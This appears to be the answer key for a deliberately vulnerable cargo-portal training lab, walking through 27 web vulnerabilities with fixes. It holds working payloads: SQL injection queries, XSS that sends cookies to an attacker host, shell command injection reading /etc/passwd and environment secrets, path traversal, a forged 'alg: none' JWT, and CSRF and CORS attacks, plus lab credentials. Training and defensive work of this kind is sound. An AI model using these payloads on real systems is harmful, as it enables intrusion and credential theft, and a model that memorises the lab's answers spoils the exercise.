# SOLUTIONS — Meridian Cargo Portal (CHRIS-LAB)

> ⚠️ **SPOILERS.** Do not read this until you have finished your own test.
> Target: `http://192.168.255.133:8090` (replace with your host). All PoCs below were verified against the running lab.

## Spoiler: technology stack
* **Backend:** Go 1.22 (`net/http` + `html/template`), single binary, no framework
* **Database:** MariaDB 10.11 (MySQL dialect)
* **Frontend:** server-rendered templates, jQuery 3.3.1, Bootstrap 3.3.7, lodash 4.17.15
* **Deployment:** Docker Compose (`meridian-web` + `meridian-db`)

## Seed accounts (none are given to the tester)

| Username | Password | Role | Company | How a tester finds it |
|---|---|---|---|---|
| `admin` | `Fr3ightAdm!n#7` | admin | Meridian | not crackable — reach admin via #17 / #19 |
| `ops.desk` | `qwerty123` | staff | Meridian | SHA-1 hash from #1, crack (rockyou) |
| `dispatch.temp` | `Temp#2024` | staff | Meridian | HTML comment on `/login` (#10) |
| `alice` / `bob` | `sunshine1` / `bobby123` | customer | Acme Textiles | #1 hash crack, #20 brute force |
| `carla` / `dmitri` | `Passw0rd!` / `iloveships` | customer | Globex Marine | #1 crack, #20, #22 |
| `erin` | `erin2024` | customer | Northline Foods | #25 (pre-seeded log), #22 |
| `farid` | `Electr0nics5` | customer | Bluewave Electronics | #1 |

Hashes are unsalted SHA-1, e.g. `qwerty123` → `5cec175b165e3d5e62c9e13ce848ef6feac81bff`.

## Findings overview

| # | OWASP 2025 | CWE | Vulnerability | Location |
|---|---|---|---|---|
| 1 | A05 Injection | CWE-89 | SQL injection (UNION, visible) | `GET /ports?q=` |
| 2 | A05 | CWE-89 | SQL injection (blind boolean / time) | `GET /api/v2/shipments/count?status=` |
| 3 | A05 | CWE-79 | Reflected XSS | `GET /help?q=` |
| 4 | A05 | CWE-79 | Stored XSS | `POST /shipments/note` → shipment page + `/ops` queue |
| 5 | A05 | CWE-78 | OS command injection | `POST /ops/tools` (`host`) |
| 6 | A01 Broken Access Control | CWE-22 | Path traversal | `GET /documents/download?name=` |
| 7 | A01 | CWE-548 | Directory listing | `/exports/`, `/uploads/` |
| 8 | A01 | CWE-918 | SSRF | `POST /api/v2/webhooks/test` |
| 9 | A01 | CWE-352 | CSRF | `GET/POST /account/contact` |
| 10 | A01 | CWE-615 | Secrets in source comments | `/login` HTML, `/static/js/portal.js` |
| 27 | A01 | CWE-639 | IDOR | `GET /account/invoices/view?id=` |
| 11 | A02 Misconfiguration | CWE-942 | Permissive CORS with credentials | `/api/v2/*` |
| 12 | A02 | CWE-489/215 | Debug endpoints exposed (env, pprof) | `/debug/vars`, `/debug/pprof/` |
| 13 | A02 | CWE-1004 | Session cookie without HttpOnly/Secure/SameSite | `MCSESS` |
| 14 | A03 Supply Chain | CWE-1104/1395 | Known-vulnerable components | jQuery 3.3.1, Bootstrap 3.3.7, lodash 4.17.15 |
| 15 | A04 Cryptographic Failures | CWE-319 | Cleartext transmission | whole site (HTTP) |
| 16 | A04 | CWE-328 | Weak, unsalted password hash (SHA-1) | `users.password_hash` |
| 17 | A06 Insecure Design | CWE-266/915 | Incorrect privilege assignment (mass assignment) | `POST /api/v2/register` |
| 18 | A06 | CWE-1021 | Clickjacking | all pages |
| 19 | A07 Auth Failures | CWE-347 | JWT `alg: none` accepted | `Authorization: Bearer` |
| 20 | A07 | CWE-307 | No lockout / single-factor login | `POST /login`, `POST /api/v2/auth/token` |
| 21 | A07 | CWE-384 | Session fixation | `MCSESS` |
| 22 | A07 | CWE-640 | Weak password recovery | `POST /forgot`, `/forgot/verify` |
| 23 | A08 Integrity | CWE-434 | Unrestricted file upload | `POST /documents/upload` |
| 24 | A08 | CWE-602 | Client-side price trust / tampering | `POST /quote/book` (`rate_cents`) |
| 25 | A09 Logging | CWE-532 | Sensitive data in logs | `/ops/logs`, `app.log` |
| 26 | A10 Exceptional Conditions | CWE-209 | Verbose errors / stack traces | `GET /api/v2/shipments/{id}` |

(27 findings; #27 is listed in the A01 group for readability.)

---

## Detailed solutions

Notation: `T` = a valid bearer token (`POST /api/v2/auth/token`), `C` = a session cookie jar from a logged-in customer.

### 1. SQL injection — UNION (`/ports?q=`)
The search term is concatenated into
`SELECT code,name,country,region,notes FROM ports WHERE name LIKE '%q%' OR code LIKE '%q%' OR country LIKE '%q%' ORDER BY name`.
Five columns, all rendered. SQL errors are swallowed (generic "unavailable" message), so use UNION / boolean rather than error-based.

```
GET /ports?q=zzz' UNION SELECT 1,username,password_hash,role,email FROM users-- -
GET /ports?q=zzz' UNION SELECT 1,table_name,column_name,3,4 FROM information_schema.columns WHERE table_schema=database()-- -
GET /ports?q=zzz' UNION SELECT 1,service,username,secret,5 FROM integration_keys-- -
```
Dumps every user + SHA-1 hash (→ #16), and the `integration_keys` table (third-party credentials).
Stacked queries and `INTO OUTFILE`/`LOAD_FILE` do **not** work (no FILE privilege, single statements).
**Fix:** parameterised queries (`db.Query("... LIKE ?", "%"+q+"%")`), least-privilege DB user.

### 2. SQL injection — blind (`/api/v2/shipments/count?status=`)
Requires a token/session (register first). Query: `... WHERE company_id = <n> AND status = '<status>'`; output is only a count, errors are generic.
```
GET /api/v2/shipments/count?status=Delivered' AND 1=1-- -    -> count 1 (Acme)
GET /api/v2/shipments/count?status=Delivered' AND 1=2-- -    -> count 0
# boolean extraction (OR makes the whole table match, so it works for any account):
status=x' OR (SELECT SUBSTRING(password_hash,1,1) FROM users WHERE username='admin')='a'-- -    -> 0 or >0
# time-based:
status=Delivered' AND IF(1=1,SLEEP(3),0)-- -      (use a status that exists for your company)
```
Note: `OR SLEEP(n)` sleeps once **per row** (all shipments) and will be very slow — prefer `AND IF(...)`. sqlmap works: `--technique=BT --dbms=mysql`.
**Fix:** parameterise; validate `status` against an allow-list.

### 3. Reflected XSS (`/help?q=`)
When no article matches, the term is echoed unescaped in the "No articles found for …" message.
`/help?q=<img src=x onerror=alert(document.domain)>zzz`
No filtering of tags/keywords. **Fix:** contextual output encoding (do not use `template.HTML` on user data), CSP.

### 4. Stored XSS (delivery instructions)
`POST /shipments/note` (`id`, `instructions`) stores raw HTML; it is rendered unescaped in the customer's shipment page (`/shipments/view?id=`) **and** in the staff dispatch queue (`/ops`), so it fires in a privileged context (account takeover of staff via cookie theft — the cookie lacks HttpOnly, #13). The same field can be set at booking time (`/quote/book`).
`instructions=<svg onload=fetch('//attacker/?c='+document.cookie)>`
**Fix:** encode on output, HttpOnly cookie, CSP.

### 5. OS command injection (`POST /ops/tools`)
Staff-only "network tools" page runs `sh -c "ping -c 2 -W 2 <host>"`. Reach it via #10 (dispatch.temp), #17, #19 or the cracked staff hash.
```
host=127.0.0.1; id
host=127.0.0.1; cat /etc/passwd
host=127.0.0.1 && cat /proc/self/environ | tr '\0' '\n'
```
Output is returned in the response (non-blind). Runs as the unprivileged `mcapp` user in the container; the DB and internal loopback service are reachable from it. No filtering at all.
**Fix:** `exec.Command("ping","-c","2",host)` with strict hostname/IP validation, no shell.

### 6. Path traversal (`/documents/download?name=`)
`filepath.Join("/app/data/docs", name)` without containment check.
```
GET /documents/download?name=../../../etc/passwd
GET /documents/download?name=../../logs/app.log        (live application log → #25)
GET /documents/download?name=../../../proc/self/environ  (env incl. DB_PASS, MC_JWT_SECRET)
```
Requires any authenticated user. **Fix:** resolve and verify the path stays under the base dir; look up files by DB id, not by name.

### 7. Directory listing
`/exports/` lists finance/CRM exports (`customer_contacts_2024.csv`, `invoice_summary_2024q2.csv`, `rate_card_2024q3.csv`, `README.txt`) — unauthenticated. `/uploads/` lists all customers' uploaded files. Both are advertised/hinted by `robots.txt` (`Disallow: /exports/`) and the `portal.js` header comment. `/static/` is *not* listable (404) — the finding is the two file shares.
**Fix:** disable listing, authenticate, don't serve exports from the web root.

### 8. SSRF (`POST /api/v2/webhooks/test`)
Any authenticated user can make the server fetch an arbitrary URL; the first 4 KB of the body is returned.
```
POST /api/v2/webhooks/test   {"url":"http://127.0.0.1:9090/internal/credentials"}
```
A loopback-only service on `127.0.0.1:9090` exposes `/internal/status`, `/internal/credentials` (carrier EDI + customs gateway passwords) and `/internal/ops-token`. Also usable for internal port scanning (`reachable:false` + error text). Only `http/https` schemes are supported.
**Fix:** allow-list destinations, block loopback/link-local/private ranges after DNS resolution, don't return the body.

### 9. CSRF (`/account/contact`)
Changing e-mail/phone requires only the session cookie: no token, no Origin/Referer check, no re-authentication, and the handler accepts **GET as well as POST**, so a top-level navigation works even in browsers that default cookies to `SameSite=Lax`.
```html
<a href="http://TARGET/account/contact?email=attacker@evil.example">…</a>   <!-- or auto-submitting POST form -->
```
Combine with #22 (reset PIN is sent to the e-mail on file) for account takeover. **Fix:** anti-CSRF tokens, `SameSite=Lax/Strict`, POST-only, re-auth for e-mail change.

### 10. Secrets in source comments
* `/login` HTML: `<!-- TODO MC-1182: remove staging dispatcher account (dispatch.temp / Temp#2024) before go-live -->` → staff login.
* `/static/js/portal.js` header: API base `/api/v2`, JWT/HS256 hint, and the `MC-904` note about report exports mirrored to a file share (→ #7).

### 11. CORS misconfiguration
Every `/api/v2/*` response reflects the request `Origin` and sends `Access-Control-Allow-Credentials: true`.
```
curl -sI -H 'Origin: https://evil.example' http://TARGET/api/v2/me
 → Access-Control-Allow-Origin: https://evil.example
   Access-Control-Allow-Credentials: true
```
PoC from `evil.example`: `fetch('http://TARGET/api/v2/me',{credentials:'include'})` reads the victim's profile (Firefox / browsers not enforcing Lax-by-default for unset SameSite; also exploitable with any ambient credentials). **Fix:** allow-list origins; never reflect with credentials.

### 12. Debug endpoints exposed
`/debug/vars` (expvar) → `service.env` = full process environment: `DB_PASS`, `MC_JWT_SECRET`, etc., plus command line and memory stats. `/debug/pprof/` (heap/goroutine/profile) also open without authentication. Also fingerprints the stack (Go).
Chain: leaked `MC_JWT_SECRET` → sign your own HS256 admin token (even without #19).
**Fix:** remove from production or bind to localhost/auth.

### 13. Session cookie flags
`Set-Cookie: MCSESS=<hex>; Path=/` — no HttpOnly, no Secure, no SameSite. Readable by XSS (#3/#4), sent over HTTP (#15), sent cross-site (#9).

### 14. Vulnerable components
`/static/vendor/jquery.min.js` = jQuery 3.3.1 (CVE-2019-11358 prototype pollution, CVE-2020-11022/11023 XSS), `bootstrap.min.js` 3.3.7 (CVE-2018-14040/14041/14042, CVE-2019-8331 XSS), `lodash.min.js` 4.17.15 (CVE-2020-8203, CVE-2020-28500, CVE-2021-23337). Detectable with Retire.js / Burp. **Fix:** upgrade.

### 15. Cleartext transmission
Whole application over plain HTTP (login form, session cookie, bearer tokens, passwords in #17/#20 requests), no HSTS, no redirect to HTTPS.

### 16. Weak password hashing
`password_hash` = unsalted SHA-1 (`CHAR(40)`). After #1/#12/`/api/v2/admin/users` the hashes are cracked instantly (`ops.desk` = `qwerty123`, `alice` = `sunshine1` …). **Fix:** bcrypt/argon2id with per-user salt.

### 17. Incorrect privilege assignment (mass assignment)
The registration form's JS sends `account_type:"customer"`; the API trusts any value.
```
POST /api/v2/register
{"username":"pwn","password":"Passw0rd1","email":"p@x.example","company":"PwnCo","account_type":"admin"}
```
→ response `"role":"admin"`. Log in at `/login` → redirected to `/ops`; `/admin/users` lists every user and hash; `/ops/tools` gives command execution (#5). `staff` works the same for the ops console. **Fix:** never accept role from the client.

### 18. Clickjacking
No `X-Frame-Options` and no CSP `frame-ancestors` on any page (e.g. `/account`, `/account/contact` form, `/quote`). Frame the page in an attacker site and overlay a decoy button.

### 19. JWT `alg: none`
Tokens are HS256 (`POST /api/v2/auth/token`), but the verifier skips the signature when the header says `none` (case-insensitive).
```
header  {"alg":"none","typ":"JWT"}
payload {"uid":4,"sub":"alice","role":"admin","exp":4102444800}
Authorization: Bearer <b64(header)>.<b64(payload)>.      (empty signature)
GET /api/v2/admin/users   → all users incl. hashes
```
The same bearer also authenticates the HTML pages (`/ops`, `/admin/users`, `/ops/tools`). The `role` claim is trusted. **Fix:** pin the algorithm, always verify, read role from DB.

### 20. No lockout / single-factor authentication
`POST /login` and `POST /api/v2/auth/token` accept unlimited attempts (verified 25+ consecutive failures, then success), identical response time, no CAPTCHA, no MFA. Brute-force e.g. `carla` with a short list (`Passw0rd!`), or credential-stuff the weak seeded passwords (`alice:sunshine1`).

### 21. Session fixation
A `MCSESS` cookie is issued on the first request and **the same ID becomes the authenticated session at login**; additionally the server adopts *any well-formed (8–64 hex) cookie value* it has never issued.
```
1. Attacker sets victim cookie: MCSESS=deadbeefdeadbeef   (via XSS/cookie injection/MITM over HTTP)
2. Victim logs in
3. Attacker uses MCSESS=deadbeefdeadbeef → authenticated as victim (/dashboard 200)
```
**Fix:** regenerate session ID on login, reject unknown IDs.

### 22. Weak password recovery
* `/forgot` discloses account existence ("No account exists with that username.") → username enumeration.
* Reset uses a **4-digit PIN** (10 000 values), valid 30 min, **no attempt limit** → brute-force `POST /forgot/verify` (`username`, `pin`, `new_password`) with Intruder in minutes.
* The PIN is also written to the application log (#25) and `GET /documents/download?name=../../logs/app.log` (#6) reveals it instantly.
Takeover of any customer: `POST /forgot username=erin` → read PIN → `POST /forgot/verify`.

### 23. Unrestricted file upload
`POST /documents/upload` (multipart field `document`) — only a client-side JS check (`accept=".pdf,.jpg,.jpeg,.png"`). The server stores whatever is sent under `/uploads/<original name>` and serves it with a type derived from the extension.
```
curl -b C -F 'title=x' -F 'document=@poc.html;type=text/html' http://TARGET/documents/upload
→ http://TARGET/uploads/poc.html  (Content-Type: text/html; script executes on the portal origin)
```
Also works with `.svg`. Files are world-readable via #7. **Fix:** server-side type/extension allow-list, random names, store outside web root, `Content-Disposition: attachment`.

### 24. Client-side price trust
The quote page computes `rate_cents` in JS and posts it as a hidden field; `POST /quote/book` creates the shipment **and invoice** using that value.
```
POST /quote/book   origin=SGSIN&dest=NLRTM&mode=Sea&weight=5000&rate_cents=1&instructions=x
→ invoice for USD 0.01 on /account/invoices
```
Negative values are accepted too. **Fix:** compute price server-side.

### 25. Sensitive data in logs
`/app/logs/app.log` records login attempts with **plaintext passwords** (`auth login user=… password=…`), reset PINs, new passwords after reset, and issued JWTs. Readable by staff at `/ops/logs`, and by any customer through #6. The shipped log already contains `erin`'s, `bob`'s and `dmitri`'s credentials.

### 26. Verbose error handling
`GET /api/v2/shipments/abc` (non-numeric id) → HTTP 500 JSON with the Go error, function name, DB DSN (`mc_app@tcp(db:3306)/meridian`) and a full goroutine **stack trace** with file paths.
**Fix:** generic error + correlation id, log details server-side only.

### 27. IDOR — invoices
`GET /account/invoices/view?id=<n>` returns any company's invoice (ids 1–14 + new) — no ownership check (shipments, by contrast, *are* scoped properly). As Acme user `alice`, `?id=9` shows Northline Foods' invoice incl. billing e-mail and amount.

---

## Attack chains worth practising
1. **Comment → staff → RCE:** #10 `dispatch.temp` → `/ops` → #5 command injection → env/DB creds, internal network.
2. **Admin in one request:** #17 register as `admin`, or #19 forged JWT, or #12 leaked secret → forged HS256 admin token.
3. **Data theft:** #1 UNION → hashes → #16 crack → staff login; or #1 `integration_keys`.
4. **Account takeover:** #22 reset (PIN from logs #6/#25) or #9 CSRF e-mail change + reset.
5. **Staff session theft:** #4 stored XSS in `/ops` queue + #13 missing HttpOnly.
6. **Cloud-style pivot:** #8 SSRF → `127.0.0.1:9090/internal/*`.

## Retest checklist
After fixing, re-run: parameterised queries (#1/#2), output encoding (#3/#4), no shell (#5), path containment (#6), no listing (#7), SSRF allow-list (#8), CSRF tokens (#9), no secrets in client code (#10), strict CORS (#11), debug removed (#12), cookie flags (#13), dependency upgrades (#14), TLS (#15), bcrypt/argon2 (#16), server-side roles (#17), frame-ancestors (#18), pinned JWT alg (#19), lockout/MFA (#20), session regeneration (#21), strong recovery (#22), upload validation (#23), server-side pricing (#24), log redaction (#25), generic errors (#26), object-level authorisation (#27).
